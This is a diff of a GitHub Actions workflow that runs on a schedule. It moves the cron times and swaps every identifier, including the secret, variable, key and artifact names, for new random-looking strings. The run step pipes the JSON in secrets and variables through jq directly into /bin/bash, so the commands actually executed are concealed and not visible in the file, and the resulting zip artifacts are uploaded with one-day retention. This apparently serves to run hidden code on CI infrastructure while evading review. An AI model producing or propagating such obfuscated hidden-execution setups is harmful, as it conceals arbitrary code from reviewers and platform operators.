@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '16 0,6,12,18 * * *'
+    - cron: '26 3,9,15,21 * * *'
 concurrency:
   group: ${{ github.workflow }}
   cancel-in-progress: false
@@ -15,18 +15,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Setup and run
         env:
-          eo7615: ${{ secrets.eo7615 }}
+          r50: ${{ secrets.r50 }}
         run: |
-          printf '%s' "$eo7615" | jq -r .jy06 | /bin/bash
-          echo $ttvwr1450 | jq -r .zlv87340 | /bin/bash
-          echo $bf3997 | jq -r .ycb758 | /bin/bash
-          echo $nqrj24 | jq -r .p53 | /bin/bash
-          printf '%s' "$hyy6" | jq -r .ccszb90704 | /bin/bash
+          printf '%s' "$r50" | jq -r .it89 | /bin/bash
+          echo $ak56 | jq -r .v40 | /bin/bash
+          echo $muyez3 | jq -r .ayiy5549 | /bin/bash
+          echo $vsxpw057 | jq -r .jmyni6 | /bin/bash
 
       - name: Upload data
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: CiWqd1WS
+          name: kToIBjgR
           path: "*.zip"
           retention-days: 1
